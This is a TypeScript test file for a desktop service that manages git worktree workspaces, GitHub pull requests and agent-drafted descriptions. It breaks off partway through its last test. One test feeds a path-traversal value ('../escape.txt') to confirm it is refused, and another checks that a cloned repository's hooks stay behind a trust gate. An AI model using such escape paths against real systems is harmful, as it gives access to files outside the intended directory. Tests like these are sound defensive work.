import { execFile } from 'node:child_process'
import { createServer } from 'node:net'
import {
  access,
  chmod,
  mkdir,
  mkdtemp,
  readFile,
  realpath,
  rename,
  rm,
  stat,
  symlink,
  utimes,
  writeFile
} from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'

import type {
  AgentInfo,
  ModelInfo,
  Options,
  PermissionUpdate,
  Query,
  SDKMessage,
  SlashCommand
} from '@anthropic-ai/claude-agent-sdk'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { CommandExec } from './accounts.js'
import { ABANDONED, CWD_WATCH_SETTINGS, DENIED, type QueryFn, READ_ONLY_TOOLS } from './agent.js'
import { type Chat, MAX_CLOSED_CHATS_PER_WORKSPACE } from './chats.js'
import type { RemoteRepository } from './github.js'
import { type GitOptions, gitIn } from './git.js'
import { WORKSPACE_NAMES } from './names.js'
import { chatTranscript, projectEnvProfile, skillsDirOf } from './paths.js'
import { ProjectValidationError } from './projects.js'
import {
  type ChatEvent,
  type ChatsChangedEvent,
  type ChatStatusEvent,
  type TasksEvent,
  createService as makeService,
  sameWindows,
  SHUTDOWN_GRACE_MS,
  type OctopusService,
  type ServiceOptions,
  type UsageOutcome,
  type WorkspaceStatusEvent
} from './service.js'
import type { CliOutput, PluginCli } from './plugins.js'
import { POOL_START } from './ports.js'
import type { RecordedRun } from './runLog.js'
import type { ChatEntry } from './transcript.js'
import type { UsageLimit, UsageWindows } from './usage.js'
import { BLOCK } from './scriptEnv.js'
import { formatAside } from './sideQuestions.js'
import { listWorktrees } from './worktree.js'
import { WorkspaceError } from './workspaces.js'

const run = promisify(execFile)

/** Writes a script the way a repository carries it: under `.octopus/scripts/`, executable. */
async function carryScript(root: string, name: string, body: string): Promise<void> {
  const path = join(root, '.octopus', 'scripts', name)
  await mkdir(join(path, '..'), { recursive: true })
  await writeFile(path, body, { encoding: 'utf8', mode: 0o755 })
}

/** One window's share out of a reading, by the key the account named it with. */
function share(windows: UsageWindows | null, key: UsageLimit['key']): number | undefined {
  return windows?.limits.find((window) => window.key === key)?.utilization
}

/** The project a workspace belongs to, for the calls that take both. */
async function projectOf(on: OctopusService, workspaceId: string): Promise<string> {
  for (const project of on.listProjects()) {
    const workspaces = await on.listWorkspaces(project.id)
    if (workspaces.some((workspace) => workspace.id === workspaceId)) return project.id
  }
  throw new Error(`No workspace ${workspaceId}`)
}

/** Allows what a workspace's repository grants, as the card does after showing it. */
async function approveSettingsIn(on: OctopusService, workspaceId: string): Promise<void> {
  const { digest } = await on.workspaceTrust(workspaceId)
  await on.approveSettings(await projectOf(on, workspaceId), workspaceId, digest)
}

/** Allows the scripts a workspace's repository supplies, as the Scripts tab does. */
async function approveScriptsIn(on: OctopusService, workspaceId: string): Promise<void> {
  const { digest } = await on.workspaceScripts(workspaceId)
  await on.approveScripts(await projectOf(on, workspaceId), workspaceId, digest)
}

let dir: string
let service: OctopusService

async function initRepo(path: string): Promise<void> {
  await mkdir(path, { recursive: true })
  await run('git', ['init', '-q', '--initial-branch=main'], { cwd: path })
  await run('git', ['config', 'user.email', 'test@example.com'], { cwd: path })
  await run('git', ['config', 'user.name', 'Test'], { cwd: path })
  await writeFile(join(path, 'README.md'), '# test\n', 'utf8')
  await run('git', ['add', '.'], { cwd: path })
  await run('git', ['commit', '-q', '-m', 'first'], { cwd: path })
}

function paths(root: string): Parameters<typeof createService>[0] {
  return {
    stateFilePath: join(root, 'state.json'),
    stateTempFilePath: join(root, 'state.json.tmp'),
    configFilePath: join(root, 'config.json'),
    // Without this, worktrees would land in the real ~/.octopus.
    dataRoot: join(root, 'data'),
    // Without this, a usage read would look at the real CLI's config.
    cliConfigDir: join(root, 'cli')
  }
}

/**
 * Every service this file makes, so teardown can stop them all.
 *
 * A wrapper around the real `createService` rather than a change at every call
 * site, of which there are fifty. The name is the imported one, so nothing else
 * in the file knows the difference.
 */
const started: OctopusService[] = []

/**
 * The ports something answers on, as far as every service here is concerned.
 * Empty unless a test fills it; `docs/testing.md` says why it is not the
 * machine's.
 */
const answering = new Set<number>()

async function createService(options: ServiceOptions = {}): Promise<OctopusService> {
  // Nobody outranks a window and no file names a skill unless a test says so:
  // the defaults read the machine's own `~/.claude/settings.json` and
  // environment.
  const made = await makeService({
    windowOverride: () => Promise.resolve(null),
    skillsInFiles: () => Promise.resolve(new Map()),
    listening: (port) => Promise.resolve(answering.has(port)),
    ...options
  })
  started.push(made)
  return made
}

beforeEach(async () => {
  answering.clear()
  dir = await mkdtemp(join(tmpdir(), 'octopus-service-'))
  service = await createService(paths(dir))
})

afterEach(async () => {
  /*
   * Stopped before the directory goes, and this is not tidiness.
   *
   * A service writes transcripts and state from event handlers with nothing
   * awaiting them, so a turn still running when `rm` starts writes into a
   * directory being removed — `ENOTEMPTY: directory not empty, rmdir`, in
   * whichever test the runner tears down next rather than in the one that left
   * the work running. `closeChats` abandons the open questions and waits for
   * what they were holding up.
   */
  await Promise.allSettled(started.map((one) => one.closeChats()))
  started.length = 0

  // Retried because that wait is bounded: `closeChats` gives up after
  // `SHUTDOWN_GRACE_MS`, as a quit should, and on a loaded CI runner a write
  // can still land after it — the same `ENOTEMPTY`, in the MCP question tests
  // twice in a row. The write is real and finishing; the removal just waits.
  await rm(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 })
})

describe('default paths', () => {
  it('works in ~/.octopus when given no parameters', async () => {
    const previousHome = process.env.HOME
    process.env.HOME = dir

    try {
      const withDefaults = await createService()
      expect(withDefaults.listProjects()).toHaveLength(0)
      expect(withDefaults.getConfig().version).toBe(2)

      // The config must land in the .octopus subdirectory of the home directory.
      await expect(readFile(join(dir, '.octopus', 'config.json'), 'utf8')).resolves.toContain(
        'deviceId'
      )
    } finally {
      process.env.HOME = previousHome
    }
  })
})

describe('GitHub projects', () => {
  const repository: RemoteRepository = {
    name: 'planner',
    nameWithOwner: 'ytsykvas/planner',
    owner: { login: 'ytsykvas' },
    description: null,
    isPrivate: true,
    updatedAt: '2026-08-01T00:00:00Z',
    defaultBranchRef: { name: 'main' }
  }

  /** The GraphQL reply `gh api graphql` prints for that one repository. */
  const reply = JSON.stringify({
    data: {
      viewer: {
        login: 'ytsykvas',
        organizations: { nodes: [] },
        repositories: {
          pageInfo: { hasNextPage: false, endCursor: null },
          nodes: [{ ...repository, isArchived: false, viewerPermission: 'ADMIN' }]
        }
      }
    }
  })

  it('lists what gh reports', async () => {
    const commandExec: CommandExec = () => Promise.resolve(reply)
    const withGitHub = await createService({ ...paths(dir), commandExec })

    await expect(withGitHub.listRemoteRepositories()).resolves.toMatchObject({
      repositories: [expect.objectContaining({ nameWithOwner: expect.any(String) })],
      capped: false,
      organisations: []
    })
  })

  it('surfaces a GitHub failure rather than an empty list', async () => {
    const commandExec: CommandExec = () => Promise.reject(new Error('not signed in'))
    const withGitHub = await createService({ ...paths(dir), commandExec })

    await expect(withGitHub.listRemoteRepositories()).rejects.toThrow()
  })

  it('clones a repository and adds it as a project', async () => {
    const destination = join(dir, 'clones')
    await mkdir(destination, { recursive: true })

    // The fake clone builds a real repository, so the project can actually
    // be validated afterwards — a mock returning success would prove nothing.
    const commandExec: CommandExec = async (_command, args) => {
      if (args[0] === 'repo' && args[1] === 'clone') {
        const target = args[3]
        if (target !== undefined) await initRepo(target)
      }
      return ''
    }

    const withGitHub = await createService({ ...paths(dir), commandExec })
    const project = await withGitHub.addProjectFromGitHub(repository, destination)

    expect(project.name).toBe('planner')
    expect(withGitHub.listProjects()).toHaveLength(1)
  })

  it('does not add a project when the clone fails', async () => {
    const commandExec: CommandExec = () => Promise.reject(new Error('clone failed'))
    const withGitHub = await createService({ ...paths(dir), commandExec })

    await expect(withGitHub.addProjectFromGitHub(repository, join(dir, 'clones'))).rejects.toThrow()
    expect(withGitHub.listProjects()).toHaveLength(0)
  })

  it('falls back to the real gh when no executor is supplied', async () => {
    /*
     * No commandExec: the service must reach for the real `gh` rather than
     * leaving the capability undefined.
     *
     * Proved against a fake `gh` on `PATH`, not against GitHub. This test used
     * to call the live API, and failed whenever that request did — three runs
     * in four on one bad afternoon, none of them caused by anyone's change.
     * A gate that goes red on its own costs more than the test is worth.
     *
     * The fake refuses anything but `api graphql`, so the assertion below
     * covers the whole chain: no executor supplied, `defaultExec` used, a
     * binary called `gh` run, asked for the repository list, its answer parsed.
     */
    const binDirectory = join(dir, 'bin')
    const answer = join(dir, 'repositories.json')
    await mkdir(binDirectory, { recursive: true })
    await writeFile(answer, reply, 'utf8')
    await writeFile(
      join(binDirectory, 'gh'),
      `#!/bin/sh\n[ "$1" = api ] && [ "$2" = graphql ] || exit 1\ncat '${answer}'\n`,
      'utf8'
    )
    await chmod(join(binDirectory, 'gh'), 0o755)

    const previousPath = process.env.PATH
    process.env.PATH = `${binDirectory}:${previousPath ?? ''}`

    try {
      const plain = await createService(paths(join(dir, 'plain')))
      await expect(plain.listRemoteRepositories()).resolves.toEqual({
        repositories: [repository],
        capped: false,
        organisations: []
      })
    } finally {
      process.env.PATH = previousPath
    }
  })
})

/** Requests opened long before, and long after, any workspace a test makes. */
const EARLIER = '2000-01-01T00:00:00Z'
const LATER = '2999-01-01T00:00:00Z'

/** A `gh` answering one request on the workspace's branch, opened at `createdAt`. */
const oneRequest =
  (createdAt: string, branch: () => string) =>
  () =>
  (args: readonly string[]): Promise<string> => {
    const request = { number: 7, state: 'MERGED', url: 'https://x/pull/7', createdAt }
    return Promise.resolve(
      JSON.stringify([
        args.includes('--head')
          ? { ...request, title: 'Done' }
          : {
              ...request,
              headRefName: branch(),
              statusCheckRollup: [],
              isDraft: false,
              mergeable: 'UNKNOWN',
              mergeStateStatus: 'UNKNOWN',
              reviewDecision: ''
            }
      ])
    )
  }

describe('workspaces', () => {
  /** A service with one project already added, as the UI would have. */
  async function withProject(): Promise<{ service: OctopusService; projectId: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    return { service, projectId: project.id }
  }

  it('starts with no workspaces', async () => {
    const { service, projectId } = await withProject()
    await expect(service.listWorkspaces(projectId)).resolves.toEqual([])
  })

  it('keeps the order the projects were reordered into across a restart', async () => {
    const { service, projectId } = await withProject()
    const ledger = join(dir, 'ledger')
    await initRepo(ledger)
    const other = await service.addProjectFromPath(ledger)

    await service.reorderProjects([other.id, projectId])

    const reopened = await createService(paths(dir))
    expect(reopened.listProjects().map((item) => item.id)).toEqual([other.id, projectId])
  })

  it('creates a workspace with a generated name', async () => {
    const { service, projectId } = await withProject()

    const workspace = await service.createWorkspaceIn(projectId)
    expect(WORKSPACE_NAMES).toContain(workspace.name)

    const listed = await service.listWorkspaces(projectId)
    expect(listed).toHaveLength(1)
    expect(listed[0]?.missing).toBe(false)
  })

  /*
   * The end of the chain the whole change exists for: the remote moves on, the
   * checkout is not touched, and the workspace still starts from what the
   * remote has.
   */
  it('branches from the remote rather than from what was last fetched', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const remote = join(dir, 'remote')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })

    // A commit lands from somewhere this checkout knows nothing about.
    const elsewhere = join(dir, 'elsewhere')
    await run('git', ['clone', '-q', remote, elsewhere])
    await run('git', ['config', 'user.email', 'other@example.com'], { cwd: elsewhere })
    await run('git', ['config', 'user.name', 'Other'], { cwd: elsewhere })
    await writeFile(join(elsewhere, 'THEIRS.md'), '# theirs\n', 'utf8')
    await run('git', ['add', '.'], { cwd: elsewhere })
    await run('git', ['commit', '-q', '-m', 'from elsewhere'], { cwd: elsewhere })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: elsewhere })
    const landed = (await run('git', ['rev-parse', 'HEAD'], { cwd: elsewhere })).stdout.trim()

    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const head = (await run('git', ['rev-parse', 'HEAD'], { cwd: workspace.path })).stdout.trim()
    expect(head).toBe(landed)
  })

  it('refuses to create a workspace when the remote cannot be reached', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const remote = join(dir, 'remote')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })
    await rm(remote, { recursive: true, force: true })

    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)

    const failure = await service.createWorkspaceIn(project.id).catch((error: unknown) => error)
    expect((failure as WorkspaceError).code).toBe('fetchFailed')

    // And nothing half-made was recorded either.
    await expect(service.listWorkspaces(project.id)).resolves.toEqual([])
  })

  /*
   * The consequence of branching from the remote copy, and the reason every
   * comparison had to follow the base there.
   *
   * The base is stored as a local `main` — which is what detection produces,
   * and what this repository's own project holds. The workspace is cut from
   * `origin/main`, so measuring against local `main` would count the commit
   * that landed from elsewhere as this workspace's own work: the row would say
   * two, the diff would show somebody else's file, and neither is true.
   *
   * Coverage says nothing about this. Every line here ran before the reads were
   * changed; they simply ran against the wrong ref.
   */
  it('counts only the workspace own commits when the base moved on', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const remote = join(dir, 'remote')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })

    const elsewhere = join(dir, 'elsewhere')
    await run('git', ['clone', '-q', remote, elsewhere])
    await run('git', ['config', 'user.email', 'other@example.com'], { cwd: elsewhere })
    await run('git', ['config', 'user.name', 'Other'], { cwd: elsewhere })
    await writeFile(join(elsewhere, 'THEIRS.md'), '# theirs\n', 'utf8')
    await run('git', ['add', '.'], { cwd: elsewhere })
    await run('git', ['commit', '-q', '-m', 'from elsewhere'], { cwd: elsewhere })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: elsewhere })

    const service = await createService(paths(dir))
    const project = await service.addProjectFromPath(repo)
    expect(project.baseBranch).toBe('main')

    const workspace = await service.createWorkspaceIn(project.id)
    await writeFile(join(workspace.path, 'mine.txt'), 'mine\n', 'utf8')
    await run('git', ['add', '.'], { cwd: workspace.path })
    await run('git', ['commit', '-q', '-m', 'mine'], { cwd: workspace.path })

    const [listed] = await service.listWorkspaces(project.id)
    expect(listed?.ahead).toBe(1)

    const { diff } = await service.readWorkspaceChanges(workspace.id)
    expect(diff.files.map((file) => file.path)).toEqual(['mine.txt'])
  })

  /*
   * The one regression that would be silent.
   *
   * git spawned from Electron has no controlling terminal, so a fetch that
   * decides to ask for a password writes the prompt nowhere and waits for ever
   * — behind a button with no way to cancel, and with every test still green,
   * because a bare repository on disk never asks for anything. Nothing else
   * here would notice the protection going missing, so it is asserted directly.
   */
  it('gives the fetch a deadline and refuses to let git ask for a password', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const remote = join(dir, 'remote')
    await run('git', ['init', '-q', '--bare', '--initial-branch=main', remote])
    await run('git', ['remote', 'add', 'origin', remote], { cwd: repo })
    await run('git', ['push', '-q', 'origin', 'main'], { cwd: repo })
    await run('git', ['fetch', '-q', 'origin'], { cwd: repo })

    const handed: (GitOptions | undefined)[] = []
    const service = await createService({
      ...paths(dir),
      makeExec: (cwd, options) => {
        handed.push(options)
        return gitIn(cwd, options)
      }
    })

    const project = await service.addProjectFromPath(repo)
    await service.createWorkspaceIn(project.id)

    const guarded = handed.filter((options) => options !== undefined)
    expect(guarded).not.toHaveLength(0)
    expect(guarded.every((options) => (options.timeout ?? 0) > 0)).toBe(true)
    expect(guarded.every((options) => options.env?.GIT_TERMINAL_PROMPT === '0')).toBe(true)

    // And the protection is for the fetch alone: everything else runs without a
    // deadline, because nothing else can hang.
    expect(handed.some((options) => options === undefined)).toBe(true)
  })

  it('keeps workspaces across a restart', async () => {
    const { service, projectId } = await withProject()
    await service.createWorkspaceIn(projectId)

    const restarted = await createService(paths(dir))
    await expect(restarted.listWorkspaces(projectId)).resolves.toHaveLength(1)
  })

  it('renames a workspace and its branch', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await service.renameWorkspaceById(workspace.id, 'fix auth')

    const listed = await service.listWorkspaces(projectId)
    expect(listed[0]?.name).toBe('fix auth')
    expect(listed[0]?.branch).toContain('fix-auth')
  })

  it('reports changed files', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await expect(service.workspaceHasChanges(workspace.id)).resolves.toBe(false)

    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await expect(service.workspaceHasChanges(workspace.id)).resolves.toBe(true)
    const listed = await service.listWorkspaces(projectId)
    expect(listed[0]?.changedFiles).toBe(1)
  })

  it('puts one file back to the state the workspace branched from', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')
    await writeFile(join(workspace.path, 'README.md'), '# changed\n', 'utf8')

    await service.revertWorkspaceFile(workspace.id, 'draft.txt')

    // Only the one asked for: the other change is still there to be reviewed.
    const { diff } = await service.readWorkspaceChanges(workspace.id)
    expect(diff.files.map((file) => file.path)).toEqual(['README.md'])
    await expect(access(join(workspace.path, 'draft.txt'))).rejects.toThrow()
  })

  // The path becomes a git argument and, for a file nobody added, a file to
  // delete — so it is refused before it reaches either.
  it('refuses to revert a path that leaves the workspace', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)

    await expect(service.revertWorkspaceFile(workspace.id, '../escape.txt')).rejects.toThrow()
  })

  /*
   * Typed the way a branch reads on GitHub, the prefix used to give
   * `octo//magda`, and every new workspace failed with git's own refusal.
   */
  it('creates a workspace under a prefix typed with a slash too many', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const service = await createService(paths(dir))
    await service.updateConfig({ branchPrefix: 'octo/' })
    const project = await service.addProjectFromPath(repo)

    const workspace = await service.createWorkspaceIn(project.id)

    expect(workspace.branch).toMatch(/^octo\/[^/]+$/)
  })

  /*
   * A file whose times moved and whose content did not — a binary as well as a
   * text one. A plain `git diff` against the working tree refreshes the index
   * for it and writes it back under `index.lock` (`--no-optional-locks` or
   * not), and a `git add` in the worktree at that moment fails. The pane reads
   * as a turn ends, which is when those run. Read against a copy of the index,
   * git refreshes the copy and the worktree's own is never written.
   */
  it('reads the changes without writing the worktree\u2019s index', async () => {
    const { service, projectId } = await withProject()
    const repo = join(dir, 'planner')
    await writeFile(join(repo, 'logo.png'), Uint8Array.from([0x89, 0x50, 0x00, 0x01, 0x02]))
    await run('git', ['add', 'logo.png'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'logo'], { cwd: repo })
    const workspace = await service.createWorkspaceIn(projectId)
    await writeFile(join(workspace.path, 'README.md'), '# changed\n', 'utf8')
    const later = new Date(Date.now() + 60_000)
    await utimes(join(workspace.path, 'logo.png'), later, later)
    const { stdout } = await run(
      'git',
      ['rev-parse', '--path-format=absolute', '--git-path', 'index'],
      { cwd: workspace.path }
    )
    const index = stdout.trim()
    const stamp = async (): Promise<string> => {
      const info = await stat(index)
      return `${String(info.ino)}:${String(info.mtimeMs)}`
    }
    const before = await stamp()

    const { diff, sides } = await service.readWorkspaceChanges(workspace.id)

    expect(await stamp()).toBe(before)
    expect(diff.files.map((file) => file.path)).toEqual(['README.md'])
    expect(Object.keys(sides)).toEqual(['README.md'])
  })

  it('reads what a workspace changed against the project’s base branch', async () => {
    const { service, projectId } = await withProject()
    const workspace = await service.createWorkspaceIn(projectId)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    const { diff } = await service.readWorkspaceChanges(workspace.id)

    expect(diff.baseBranch).toBe('main')
    expect(diff.files.map((file) => file.path)).toEqual(['draft.txt'])
    expect(diff.added).toBe(1)
  })

  /** An agent that answers once, in the shape the parser expects, and ends. */
  function describing(text: string): QueryFn {
    return (() => ({
      // eslint-disable-next-line @typescript-eslint/require-await
      async *[Symbol.asyncIterator]() {
        yield { type: 'assistant', message: { content: [{ type: 'text', text }] } }
      }
    })) as unknown as QueryFn
  }

  it('has the agent describe a workspace, and hands back what it wrote', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService({
      ...paths(dir),
      query: describing(
        '<<<OCTOPUS_TITLE>>>\nAdd a draft\n<<<OCTOPUS_BODY>>>\nBecause it was missing.\n<<<OCTOPUS_COMMIT>>>\nAdd a draft'
      )
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    // The worktree is dirty, so the commit that will carry it is described too.
    await expect(service.draftPullRequest(workspace.id)).resolves.toEqual({
      title: 'Add a draft',
      body: 'Because it was missing.',
      commitMessage: 'Add a draft'
    })
  })

  /*
   * Reported: a workspace whose request had been merged could not be removed
   * with its branch. A squash merge replaces the commits, so git sees none of
   * them in the base — and squash is one of the three the merge button offers,
   * so the app was refusing to clean up after itself.
   */
  it("removes a squash-merged workspace with its branch, on GitHub's word", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService({ ...paths(dir), makeGh: oneRequest(LATER, () => '') })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const run = promisify(execFile)
    const inside = (args: string[]): Promise<string> =>
      run('git', args, { cwd: workspace.path }).then(({ stdout }) => stdout)
    const outside = (args: string[]): Promise<string> =>
      run('git', args, { cwd: repo }).then(({ stdout }) => stdout)

    await writeFile(join(workspace.path, 'work.txt'), 'work\n', 'utf8')
    await inside(['add', '.'])
    await inside(['commit', '-q', '-m', 'work'])
    // What a squash merge leaves behind: the content in main, the commit not.
    await outside(['merge', '--squash', workspace.branch])
    await outside(['commit', '-q', '-m', 'squashed'])

    await service.removeWorkspaceById(workspace.id, { deleteBranch: true })

    await expect(outside(['branch', '--list', workspace.branch])).resolves.toBe('')
  })

  it('keeps refusing when the merged request predates the workspace', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService({ ...paths(dir), makeGh: oneRequest(EARLIER, () => '') })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const run = promisify(execFile)
    await writeFile(join(workspace.path, 'work.txt'), 'work\n', 'utf8')
    await run('git', ['add', '.'], { cwd: workspace.path })
    await run('git', ['commit', '-q', '-m', 'never merged'], { cwd: workspace.path })

    await expect(
      service.removeWorkspaceById(workspace.id, { deleteBranch: true })
    ).rejects.toMatchObject({ code: 'branchUnmerged' })
  })

  // gh missing or signed out leaves the git answer as the only one there is,
  // and it still protects the branch.
  it('keeps refusing when GitHub cannot be asked', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const service = await createService({
      ...paths(dir),
      makeGh: () => () => Promise.reject(new Error('gh: not logged in'))
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const run = promisify(execFile)
    const inside = (args: string[]): Promise<string> =>
      run('git', args, { cwd: workspace.path }).then(({ stdout }) => stdout)

    await writeFile(join(workspace.path, 'work.txt'), 'work\n', 'utf8')
    await inside(['add', '.'])
    await inside(['commit', '-q', '-m', 'never merged'])

    await expect(
      service.removeWorkspaceById(workspace.id, { deleteBranch: true })
    ).rejects.toMatchObject({ code: 'branchUnmerged' })
  })

  it.each([
    ['leaves out a request older than the workspace', EARLIER, null, []],
    ["keeps the workspace's own request", LATER, { number: 7 }, [{ number: 7 }]]
  ])('%s, in the pane and the list', async (_name, openedAt, request, requests) => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    let branch = ''
    const service = await createService({
      ...paths(dir),
      makeGh: oneRequest(openedAt, () => branch)
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    branch = workspace.branch

    await expect(service.readPullRequest(workspace.id)).resolves.toMatchObject({ request })
    await expect(service.readBranchRequests(project.id)).resolves.toMatchObject({ requests })
  })

  it("takes no request opened before a rename as the renamed workspace's own", async () => {
    vi.useFakeTimers({ toFake: ['Date'], now: new Date('2026-10-21T12:00:00Z') })
    try {
      const repo = join(dir, 'planner')
      await initRepo(repo)

      const service = await createService({
        ...paths(dir),
        makeGh: oneRequest('2026-10-21T12:30:00Z', () => '')
      })
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)
      vi.setSystemTime(new Date('2026-10-21T13:00:00Z'))
      await service.renameWorkspaceById(workspace.id, 'fix auth')

      await expect(service.readPullRequest(workspace.id)).resolves.toMatchObject({ request: null })
    } finally {
      vi.useRealTimers()
    }
  })

  // Nothing to commit means nothing to ask about: a commit message for a clean
  // worktree is an answer with nowhere to go.
  it('asks for no commit message when the worktree is clean', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    let asked = ''
    const service = await createService({
      ...paths(dir),
      query: ((params: { prompt: AsyncIterable<{ message: { content: unknown } }> }) => {
        void (async () => {
          for await (const message of params.prompt) {
            if (typeof message.message.content === 'string') asked += message.message.content
          }
        })()
        return {
          // eslint-disable-next-line @typescript-eslint/require-await
          async *[Symbol.asyncIterator]() {
            yield {
              type: 'assistant',
              message: {
                content: [{ type: 'text', text: '<<<OCTOPUS_TITLE>>>\nT\n<<<OCTOPUS_BODY>>>\nB' }]
              }
            }
          }
        }
      }) as unknown as QueryFn
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await expect(service.draftPullRequest(workspace.id)).resolves.toMatchObject({
      commitMessage: null
    })
    expect(asked).not.toContain('OCTOPUS_COMMIT')
  })

  // The agent cannot run git, so what it is told about the change is all it
  // has. A prompt without the diff in it would describe nothing.
  it("gives the agent this workspace's own diff to describe", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    let asked = ''
    const service = await createService({
      ...paths(dir),
      query: ((params: { prompt: AsyncIterable<{ message: { content: unknown } }> }) => {
        void (async () => {
          for await (const message of params.prompt) {
            if (typeof message.message.content === 'string') asked += message.message.content
          }
        })()
        return {
          // eslint-disable-next-line @typescript-eslint/require-await
          async *[Symbol.asyncIterator]() {
            yield {
              type: 'assistant',
              message: {
                content: [
                  {
                    type: 'text',
                    text: '<<<OCTOPUS_TITLE>>>\nT\n<<<OCTOPUS_BODY>>>\nB\n<<<OCTOPUS_COMMIT>>>\nC'
                  }
                ]
              }
            }
          }
        }
      }) as unknown as QueryFn
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await service.draftPullRequest(workspace.id)

    expect(asked).toContain('draft.txt')
    expect(asked).toContain(workspace.branch)
  })

  /*
   * The one place the app writes a description **itself**, and it read a chain
   * one layer short: `effectiveInstruction` directly, so the project's copy and
   * the installation's were consulted and the repository's own was not. A
   * checkout supplying `.octopus/instructions/pull-request.md` was therefore
   * obeyed by the pane and by all six prepared prompts, and ignored here — with
   * nothing saying so.
   */
  it("takes the repository's own pull request instruction into the draft", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    /*
     * Committed before the workspace exists, and that is the whole of what
     * makes this test say anything. Written into the worktree instead it is an
     * untracked file, so its text reaches the prompt through the **diff** — and
     * the assertion below then holds whether or not the instruction was read at
     * all. Written that way first, and the mutation caught it.
     */
    await mkdir(join(repo, '.octopus', 'instructions'), { recursive: true })
    await writeFile(
      join(repo, '.octopus', 'instructions', 'pull-request.md'),
      'Say it in Ukrainian.\n',
      'utf8'
    )
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'instructions'], { cwd: repo })

    let asked = ''
    const service = await createService({
      ...paths(dir),
      query: ((params: { prompt: AsyncIterable<{ message: { content: unknown } }> }) => {
        void (async () => {
          for await (const message of params.prompt) {
            if (typeof message.message.content === 'string') asked += message.message.content
          }
        })()
        return {
          // eslint-disable-next-line @typescript-eslint/require-await
          async *[Symbol.asyncIterator]() {
            yield {
              type: 'assistant',
              message: {
                content: [
                  {
                    type: 'text',
                    text: '<<<OCTOPUS_TITLE>>>\nT\n<<<OCTOPUS_BODY>>>\nB\n<<<OCTOPUS_COMMIT>>>\nC'
                  }
                ]
              }
            }
          }
        }
      }) as unknown as QueryFn
    })
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await writeFile(join(workspace.path, 'draft.txt'), 'work\n', 'utf8')

    await service.draftPullRequest(workspace.id)

    expect(asked).toContain('Say it in Ukrainian.')
  })

  /*
   * The draft is an agent run in the worktree like any chat, and it left
   * `settingSources` out — which the SDK reads as "load everything". So a clone
   * whose hooks nobody had read ran them the moment somebody asked for a
   * description, past the gate every chat in the same worktree is held at.
   */
  it('holds the draft at the trust gate a chat is held at', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)

    const asked: unknown[] = []
    const service = await createService({
      ...paths(dir),
      query: ((params: { options?: { settingSources?: unknown } }) => {
        asked.push(params.options?.settingSources)
        return {
          // eslint-disable-next-line @typescript-eslint/require-await
          async *[Symbol.asyncIterator]() {
            yield {
              type: 'assistant',
              message: {
                content: [
                  {
                    type: 'text',
